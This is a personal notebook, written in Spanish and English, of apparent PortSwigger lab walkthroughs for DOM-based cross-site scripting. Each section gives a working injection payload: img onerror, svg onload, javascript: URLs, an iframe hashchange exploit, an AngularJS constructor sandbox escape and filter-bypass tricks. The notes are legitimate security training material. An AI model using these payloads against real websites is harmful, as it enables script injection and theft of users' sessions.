# DOM XSS Laboratories

```mermaid
flowchart 
 classDef green color:#022e1f,fill:#00f500;
   classDef red color:#022e1f,fill:#f11111;
   classDef white color:#022e1f,fill:#fff;
   classDef black color:#fff,fill:#000;

A3[DOM XSS]:::white

A3-->B3[Different sources and sinks]
A3-->W3{DOM+stored xss}
B3-->|En el search|C3[escribimos directamente]
A3-->F3[Third party dependencies]
B3-->L3[document write]
L3-->|inside select|P3[Need close select]
L3-->|In the search for example|Q3[script directly without script tag]
B3-->Z3[innerthtml]-->R3[need into img and use onerror]

W3-->V3[eval data is reflected string]
W3-->S3[Innerhtml without script tag]


subgraph thirdparty
F3-->G3[Jquery]
F3-->H3[Angular]
H3-->K3[ng-app]
G3-->|return path|J3[addatribute]

G3-->X3[using selector and add iframe]
end
```

## Lab: DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

```js
"><svg onload=alert()><"
```

## Lab: DOM XSS in document.write sink using source location.search inside a select element


This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.
```js
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```
1. Dom invader nos detecta un problema en el dom
![](assets/2022-07-13-11-58-14.png)

2. probamos escribir directamente el script , al no funcionar vamos al siguiente paso.
3. Buscamos el código, vemos que está dentro de un select
4. 
![](assets/2022-07-13-11-51-56.png)

4. buscamos los parámetros que necesita
   
   ![](assets/2022-07-13-12-06-29.png)

5. Si pongo directamente no funciona, hay que ir cerrando etiquetas

 ![](assets/2022-07-13-12-00-27.png)


```html
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

## Lab: DOM XSS in innerHTML sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function.


El dom invader nos avisa que hay una vulnerabilidad

![](assets/2022-07-13-19-08-11.png)

![](assets/2022-07-13-19-07-53.png)


En esta sección puedo directamente poner el script. Lo que hacemos es llamar a una imagen la cual va a dar error al estar src=1 y luego cuando de el error ejecuta una acción.

![](assets/2022-07-13-19-10-42.png)

![](assets/2022-07-13-19-38-58.png)

## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie.

![](assets/2022-07-13-19-39-56.png)

Nos quedamos con el attribute

![](assets/2022-07-13-19-41-07.png)

Recordamos los apuntes

```js
?returnUrl=javascript:alert(document.domain)
```
Lo añadimos a la url

![](assets/2022-07-13-19-43-13.png)

## Lab: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

Exploramos la web. Vemos que tiene un exploit server y además una vulnerabilidad en el dom.


![](assets/2022-07-13-19-47-44.png)

![](assets/2022-07-13-19-48-29.png)

Recordamos los apuntes

Vemos que tiene una vulnearbilidad del tipo $() selector
![](assets/2022-07-13-19-52-25.png)

```js

$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});

Poner...

<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
Añadimos en el body de nuestro servidor exploit este código y ponemos la dirección de nuestro web que queremos explotar (no la del servidor exploit) Con esto podremos observar en nuestra pantalla cosas. Además en vez del alert el ejercicio pide un print()
```js
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```


Lo mandamos

![](assets/2022-07-13-20-10-26.png)

## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.

![](assets/2022-07-13-20-18-47.png)

![](assets/2022-07-13-20-21-28.png)

Comprobamos que está dentro de un ng-algo

![](assets/2022-07-13-20-23-34.png)

>Creía que poniendo únicamente {{alert()}} funcionaría pero no

He buscado en google alert angular xss

![](assets/2022-07-13-20-28-31.png)

Por lo que probaré

{{constructor.constructor('alert(1)')()}}

![](assets/2022-07-13-20-29-24.png)

## Lab: Reflected DOM XSS

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function.

![](assets/2022-07-13-20-41-12.png)

Intento cerrar las comillas cargar el javascript  y comentar pero parece que no. Además he visto que no se puede comentar en los json

" alert(1)}//

![](assets/2022-07-13-20-54-00.png)

Aquí lo interesante es 
  1. nos está escapando automáticamente el "

Si ponemos un \delante de las comillas nos lo va a escapar también

Voy a intentar

\" alert(1)}//

![](assets/2022-07-13-20-56-14.png)

Si vemos ahora nos lo ha escapado. Abajo aparece el espacio como un + por lo que en vez de espacio pondré un + en el search

\"+alert(1)}//

Y me lo ejecuta

![](assets/2022-07-13-20-57-38.png)

## Lab: Stored DOM XSS

This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.

![](assets/2022-07-13-21-01-56.png)

Entiendo que el comentario va donde el exploit por lo que hay que cerrarlo de alguna forma para que lance el alert.

Vimos antes que el alert stored se hace con
```
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'

<img src=1 onerror=alert(1)>
```

Si lo pongo directamente en la url me dice que la id no es válida

Si lo pongo dentro del comentario desaparece totalmente... pienso que puede estar borrando las cadenas. Voy a probar ponerlo dos veces

```html
<img src=1 onerror=alert(1)><img src=1 onerror=alert(1)>
```

Perfecto funciona, pero podría haber probado varias XD

![](assets/2022-07-13-21-11-08.png)